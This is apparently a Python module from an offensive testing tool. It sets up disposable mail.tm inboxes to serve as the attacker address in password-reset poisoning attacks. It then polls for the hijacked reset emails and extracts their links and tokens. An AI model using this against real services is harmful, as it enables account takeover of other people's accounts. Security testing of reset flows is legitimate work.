#!/usr/bin/env python3
"""
Disposable inbox provider (mail.tm) for OOB reset-email capture without any infra.

gyp provisions a throwaway mailbox on a real, internet-reachable domain, uses its
address as the attacker `-e`, then polls it for the hijacked reset email. Messages
are normalized to the SAME shape as mini_interact's /api/mail so the mail_analysis
module can consume either source transparently.

Caveat: disposable domains are sometimes blocklisted by targets.
"""
import sys
sys.dont_write_bytecode = True

import re
import secrets
import time

from utils.utils import requests

MAILTM_BASE = "https://api.mail.tm"

_LINK_RE = re.compile(r'https?://[^\s"\'<>\)\]]+', re.IGNORECASE)
_TOKEN_RE = re.compile(
    r'(?:token|code|reset|verify|confirm|otp|key|t)=([A-Za-z0-9\-_\.]{6,})',
    re.IGNORECASE,
)


def _extract(body):
    links = _LINK_RE.findall(body or "")
    tokens = []
    for candidate in links + [body or ""]:
        for m in _TOKEN_RE.finditer(candidate):
            if m.group(1) not in tokens:
                tokens.append(m.group(1))
    return links, tokens


def _addr_list(field):
    """mail.tm 'to'/'cc' = [{'address':..,'name':..}] → ['a@b', ...]."""
    out = []
    for item in field or []:
        if isinstance(item, dict) and item.get("address"):
            out.append(item["address"])
        elif isinstance(item, str):
            out.append(item)
    return out


def _normalize(msg):
    """mail.tm message → the same dict shape as mini_interact's /api/mail entries."""
    frm = msg.get("from", {})
    from_str = frm.get("address", "") if isinstance(frm, dict) else str(frm)
    tos = _addr_list(msg.get("to"))
    ccs = _addr_list(msg.get("cc"))

    body = msg.get("text") or ""
    if not body and msg.get("html"):
        html = msg["html"]
        body = " ".join(html) if isinstance(html, list) else html

    links, tokens = _extract(body)
    return {
        "time": msg.get("createdAt", ""),
        "mail_from": from_str,
        "rcpt_tos": tos,          # in a disposable inbox everything went to our address
        "from": from_str,
        "to": ", ".join(tos),
        "cc": ", ".join(ccs),
        "subject": msg.get("subject", "") or "",
        "body": body[:5000],
        "links": links[:20],
        "tokens": tokens[:20],
    }


WEBMAIL_URL = "https://mail.tm/"   # browser client: log in with address + password


class DisposableInbox:
    def __init__(self, address, token, password=None):
        self.address = address
        self.token = token
        self.password = password

    @property
    def webmail_url(self):
        return WEBMAIL_URL

    @property
    def _headers(self):
        return {"Authorization": f"Bearer {self.token}", "Accept": "application/json"}

    def messages(self):
        """Return all messages, normalized to the sink shape."""
        out = []
        try:
            r = requests.get(f"{MAILTM_BASE}/messages", headers=self._headers, timeout=15)
            if r.status_code != 200:
                return out
            data = r.json()
            items = data.get("hydra:member", data) if isinstance(data, dict) else data
        except Exception:
            return out

        for it in items or []:
            mid = it.get("id")
            if not mid:
                continue
            try:
                fr = requests.get(f"{MAILTM_BASE}/messages/{mid}", headers=self._headers, timeout=15)
                full = fr.json() if fr.status_code == 200 else it
            except Exception:
                full = it
            out.append(_normalize(full))
        return out


def create_inbox(retries=3):
    """Provision a mail.tm mailbox. Returns DisposableInbox or None on failure.

    mail.tm rate-limits account creation (HTTP 429), so we retry with backoff."""
    try:
        d = requests.get(f"{MAILTM_BASE}/domains", timeout=15)
        if d.status_code != 200:
            return None
        data = d.json()
        domains = data.get("hydra:member", data) if isinstance(data, dict) else data
        domain = next((dom.get("domain") for dom in (domains or [])
                       if dom.get("domain") and dom.get("isActive", True)), None)
        if not domain:
            return None

        for attempt in range(retries):
            address = f"gyp{secrets.token_hex(6)}@{domain}"
            password = secrets.token_urlsafe(12)

            c = requests.post(f"{MAILTM_BASE}/accounts",
                              json={"address": address, "password": password}, timeout=15)
            if c.status_code in (200, 201):
                t = requests.post(f"{MAILTM_BASE}/token",
                                  json={"address": address, "password": password}, timeout=15)
                if t.status_code == 200 and t.json().get("token"):
                    return DisposableInbox(address, t.json()["token"], password)

            # 429 / transient — back off and retry
            if attempt < retries - 1:
                time.sleep(2 * (attempt + 1))
        return None
    except Exception:
        return None
